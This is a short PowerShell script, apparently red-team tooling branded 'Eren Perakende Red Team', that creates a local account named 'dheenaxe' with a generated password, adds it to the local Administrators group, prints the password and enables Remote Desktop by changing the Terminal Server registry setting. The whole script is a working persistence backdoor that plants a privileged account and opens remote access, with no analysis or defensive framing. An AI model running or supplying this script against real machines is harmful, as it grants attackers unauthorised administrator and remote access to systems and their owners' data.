
Clear-Host
Write-Host ""
Write-Host ""
Write-Host -Fore Red 
"
                 _                   _                  _ 
 _ __   ___ _ __| | ____ _ _ __   __| | ___   _ __  ___/ |
| '_ \ / _ \ '__| |/ / _` | '_ \ / _` |/ _ \ | '_ \/ __| |
| |_) |  __/ |  |   < (_| | | | | (_| |  __/_| |_) \__ \ |
| .__/ \___|_|  |_|\_\__,_|_| |_|\__,_|\___(_) .__/|___/_|
|_|                                          |_|          
" 
Write-Host -Fore Red "          Eren Perakende Red Team" 
Write-Host -Fore Gray "          https://github.com/dheenaxe/ErenRedTeam"
Write-Host ""
Write-Host ""


$username = "dheenaxe"
Add-Type -AssemblyName 'System.Web'

$passwordPlain = [System.Web.Security.Membership]::GeneratePassword(16, 4)
$password = ConvertTo-SecureString $passwordPlain -AsPlainText -Force
if (Get-LocalUser -Name $username -ErrorAction SilentlyContinue) {
    Write-Host "User '$username' already exists."
} else {
    New-LocalUser -Name $username `
                  -Password $password `
                  -FullName "dheenaxe" `
                  -Description "this user is created by Eren Red Team" `
                  -PasswordNeverExpires:$false `
                  -UserMayNotChangePassword:$false

    Add-LocalGroupMember -Group "Administrators" -Member $username

    Write-Host "User '$username' created successfully with local admin rights."
}

Write-Host "Generated password for '$username': $passwordPlain"

Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0

$rdpStatus = (Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections").fDenyTSConnections
if ($rdpStatus -eq 0) {
    Write-Output "✅ Remote Desktop is ENABLED."
} else {
    Write-Output "❌ Remote Desktop is DISABLED."
}